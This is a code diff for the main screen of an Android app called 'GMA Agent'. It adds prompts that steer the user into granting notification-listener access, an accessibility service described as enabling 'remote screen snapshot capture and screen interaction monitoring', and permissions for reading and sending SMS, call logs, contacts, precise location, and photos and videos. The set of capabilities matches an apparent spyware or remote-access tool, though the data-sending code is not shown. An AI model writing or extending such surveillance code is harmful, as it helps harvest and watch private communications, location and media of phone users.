@@ -102,6 +102,10 @@ fun MainScreen(
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
+            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
         permissionLauncher.launch(permissions.toTypedArray())
     }
@@ -161,6 +165,94 @@ fun MainScreen(
                 }
             }
 
+            // ── Notification Listener Service Card ──
+            if (!state.isNotificationListenerEnabled) {
+                item {
+                    Card(
+                        colors = CardDefaults.cardColors(
+                            containerColor = Color(0xFFFFF3E0),
+                        ),
+                        shape = RoundedCornerShape(16.dp),
+                    ) {
+                        Column(modifier = Modifier.padding(16.dp)) {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(
+                                    Icons.Default.Error,
+                                    contentDescription = null,
+                                    tint = Color(0xFFE65100),
+                                )
+                                Spacer(Modifier.width(12.dp))
+                                Column(modifier = Modifier.weight(1f)) {
+                                    Text(
+                                        "Notification Access Required",
+                                        fontWeight = FontWeight.Bold,
+                                        style = MaterialTheme.typography.bodyMedium,
+                                        color = Color(0xFFE65100),
+                                    )
+                                    Text(
+                                        "Enable GMA Agent to capture and sync incoming notifications in real-time.",
+                                        style = MaterialTheme.typography.bodySmall,
+                                        color = Color(0xFF795548),
+                                    )
+                                }
+                            }
+                            Spacer(Modifier.height(10.dp))
+                            Button(
+                                onClick = { viewModel.openNotificationListenerSettings(context) },
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE65100)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Text("Enable Notification Access")
+                            }
+                        }
+                    }
+                }
+            }
+
+            // ── Accessibility Service Card ──
+            if (!state.isAccessibilityServiceEnabled) {
+                item {
+                    Card(
+                        colors = CardDefaults.cardColors(
+                            containerColor = Color(0xFFE8EAF6),
+                        ),
+                        shape = RoundedCornerShape(16.dp),
+                    ) {
+                        Column(modifier = Modifier.padding(16.dp)) {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(
+                                    Icons.Default.Security,
+                                    contentDescription = null,
+                                    tint = Color(0xFF283593),
+                                )
+                                Spacer(Modifier.width(12.dp))
+                                Column(modifier = Modifier.weight(1f)) {
+                                    Text(
+                                        "Accessibility Service Required",
+                                        fontWeight = FontWeight.Bold,
+                                        style = MaterialTheme.typography.bodyMedium,
+                                        color = Color(0xFF283593),
+                                    )
+                                    Text(
+                                        "Enables remote screen snapshot capture and screen interaction monitoring.",
+                                        style = MaterialTheme.typography.bodySmall,
+                                        color = Color(0xFF3F51B5),
+                                    )
+                                }
+                            }
+                            Spacer(Modifier.height(10.dp))
+                            Button(
+                                onClick = { viewModel.openAccessibilitySettings(context) },
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF283593)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Text("Enable Accessibility Service")
+                            }
+                        }
+                    }
+                }
+            }
+
             // ── Permissions warning ──
             if (!state.permissionsGranted) {
                 item {
@@ -170,21 +262,49 @@ fun MainScreen(
                         ),
                         shape = RoundedCornerShape(16.dp),
                     ) {
-                        Row(
-                            modifier = Modifier.padding(16.dp),
-                            verticalAlignment = Alignment.CenterVertically,
-                        ) {
-                            Icon(
-                                Icons.Default.Error,
-                                contentDescription = null,
-                                tint = MaterialTheme.colorScheme.error,
-                            )
-                            Spacer(Modifier.width(12.dp))
-                            Text(
-                                "SMS, Call Log & Notification permissions are required for background syncing.",
-                                style = MaterialTheme.typography.bodyMedium,
-                                color = MaterialTheme.colorScheme.onErrorContainer,
-                            )
+                        Column(modifier = Modifier.padding(16.dp)) {
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                            ) {
+                                Icon(
+                                    Icons.Default.Error,
+                                    contentDescription = null,
+                                    tint = MaterialTheme.colorScheme.error,
+                                )
+                                Spacer(Modifier.width(12.dp))
+                                Text(
+                                    "SMS, Calls & Gallery Media permissions are required.",
+                                    style = MaterialTheme.typography.bodyMedium,
+                                    color = MaterialTheme.colorScheme.onErrorContainer,
+                                )
+                            }
+                            Spacer(Modifier.height(8.dp))
+                            Button(
+                                onClick = {
+                                    val perms = mutableListOf(
+                                        Manifest.permission.READ_SMS,
+                                        Manifest.permission.RECEIVE_SMS,
+                                        Manifest.permission.SEND_SMS,
+                                        Manifest.permission.READ_CALL_LOG,
+                                        Manifest.permission.READ_CONTACTS,
+                                        Manifest.permission.READ_PHONE_STATE,
+                                        Manifest.permission.ACCESS_FINE_LOCATION,
+                                        Manifest.permission.ACCESS_COARSE_LOCATION,
+                                    )
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                        perms.add(Manifest.permission.POST_NOTIFICATIONS)
+                                        perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+                                        perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+                                    } else {
+                                        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+                                    }
+                                    permissionLauncher.launch(perms.toTypedArray())
+                                },
+                                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Text("Grant Media & System Permissions")
+                            }
                         }
                     }
                 }
